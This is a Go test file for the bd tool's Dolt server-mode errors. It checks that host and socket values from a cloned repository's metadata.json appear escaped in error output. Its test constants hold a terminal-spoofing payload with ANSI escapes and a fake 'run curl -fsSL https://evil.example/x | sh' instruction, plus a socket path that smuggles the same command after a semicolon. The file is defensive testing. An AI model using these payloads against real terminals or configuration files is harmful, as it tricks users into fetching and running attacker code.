package dolt

import (
	"context"
	"errors"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"unicode"
	"unicode/utf8"
)

// hostileEndpoint is a value a cloned repository's committed metadata.json
// can carry in dolt_server_host or dolt_server_socket: a carriage return and
// ESC[2K erase the line bd printed, text of its own takes its place, and
// ESC[8m hides the advice printed after it.
const hostileEndpoint = "db.example.invalid\r\x1b[2KError: run curl -fsSL https://evil.example/x | sh #\x1b[8m"

// requireNoRawTerminalControl fails when msg holds a character a terminal
// acts on, other than the line breaks and tabs bd lays its own messages out
// with.
func requireNoRawTerminalControl(t *testing.T, msg string) {
	t.Helper()
	if !utf8.ValidString(msg) {
		t.Errorf("message holds bytes that are not UTF-8:\n%q", msg)
	}
	if i := strings.IndexFunc(msg, func(r rune) bool { return r != '\n' && r != '\t' && !unicode.IsGraphic(r) }); i >= 0 {
		t.Errorf("message prints %q raw at byte %d; the endpoint must be named through the remedy printer:\n%q", msg[i:min(len(msg), i+8)], i, msg)
	}
	if !strings.Contains(msg, `\r\x1b[2KError: run curl`) {
		t.Errorf("message does not name the endpoint escaped:\n%q", msg)
	}
}

// TestNewServerModeNamesConfiguredEndpointEscaped pins the remedy-printing
// invariant at the open of a server-mode store, the error `bd list` and every
// other command print when the configured Dolt server cannot be reached: the
// whole error (the "unreachable at" line, the dial error that repeats the
// host, and the advice under them) names a dolt_server_host or
// dolt_server_socket from metadata.json escaped, and the socket goes into the
// `dolt sql-server --socket` command only as one shell word.
func TestNewServerModeNamesConfiguredEndpointEscaped(t *testing.T) {
	for _, tc := range []struct {
		name string
		cfg  func(beadsDir string) *Config
	}{
		{"external host", func(beadsDir string) *Config {
			return &Config{Database: "beads", BeadsDir: beadsDir, Path: filepath.Join(beadsDir, "dolt"),
				ServerHost: hostileEndpoint, ServerPort: 3399}
		}},
		{"socket", func(beadsDir string) *Config {
			return &Config{Database: "beads", BeadsDir: beadsDir, Path: filepath.Join(beadsDir, "dolt"),
				ServerHost: "127.0.0.1", ServerPort: 3399,
				ServerSocket: filepath.Join(t.TempDir(), "none.sock; curl -fsSL https://evil.example/x | sh #\r\x1b[2KError: run curl")}
		}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if tc.name == "socket" && runtime.GOOS == "windows" {
				t.Skip("a Windows file name cannot hold a control character")
			}
			isolateUnresolvedPortEnv(t)
			t.Setenv("BEADS_DOLT_AUTO_START", "0")
			orig := ensureRunningDetailed
			t.Cleanup(func() { ensureRunningDetailed = orig })
			ensureRunningDetailed = func(string) (int, bool, error) {
				t.Fatal("ensureRunningDetailed ran for a server bd cannot start")
				return 0, false, nil
			}
			beadsDir := t.TempDir()
			_, err := newServerMode(context.Background(), tc.cfg(beadsDir))
			if err == nil {
				t.Fatal("open succeeded with no server at the configured endpoint")
			}
			msg := err.Error()
			requireNoRawTerminalControl(t, msg)
			if tc.name == "socket" && !strings.Contains(msg, "dolt sql-server --socket <path>  (<path>: ") {
				t.Errorf("the socket remedy does not take a <path> placeholder for a path no shell passes on unchanged:\n%s", msg)
			}
		})
	}
}

// TestCreateDatabaseRefusedErrorNamesHostEscaped pins the invariant at the
// refusal of a CREATE DATABASE connection: the configured host and the
// driver error that repeats it are named escaped beside the reachability
// check.
func TestCreateDatabaseRefusedErrorNamesHostEscaped(t *testing.T) {
	t.Parallel()
	cause := errors.New("dial tcp: lookup " + hostileEndpoint + ": no such host")
	err := createDatabaseRefusedError(&Config{ServerHost: hostileEndpoint, ServerPort: 3399}, cause)
	requireNoRawTerminalControl(t, err.Error())
	if !errors.Is(err, cause) {
		t.Error("createDatabaseRefusedError no longer wraps its cause")
	}
}

// TestNewServerModeKeepsBdsOwnLines pins the other half of the invariant:
// the printer spells the values a cloned repository sets, never bd's own
// message around them. An auto-start that fails with a multi-line error of
// bd's own, such as EnsureRunning's "dolt is not installed" with the install
// page two lines down, is reported line for line as EnsureRunning wrote it,
// not quoted onto one line.
func TestNewServerModeKeepsBdsOwnLines(t *testing.T) {
	isolateUnresolvedPortEnv(t)
	notInstalled := "dolt is not installed (not found in PATH)\n\nInstall from: https://docs.dolthub.com/introduction/installation"
	orig := ensureRunningDetailed
	t.Cleanup(func() { ensureRunningDetailed = orig })
	ensureRunningDetailed = func(string) (int, bool, error) { return 0, false, errors.New(notInstalled) }
	beadsDir := t.TempDir()
	_, err := newServerMode(context.Background(), &Config{Database: "beads", BeadsDir: beadsDir,
		Path: filepath.Join(beadsDir, "dolt"), ServerHost: "127.0.0.1", AutoStart: true})
	if err == nil {
		t.Fatal("open succeeded with auto-start failing")
	}
	msg := err.Error()
	want := "and auto-start failed: " + notInstalled + "\n\nTo start manually: bd dolt start\n" +
		"To disable auto-start: set dolt.auto-start: false in .beads/config.yaml"
	if !strings.Contains(msg, want) {
		t.Errorf("the auto-start failure is not reported as bd wrote it; want it to hold\n%s\ngot\n%s", want, msg)
	}
}
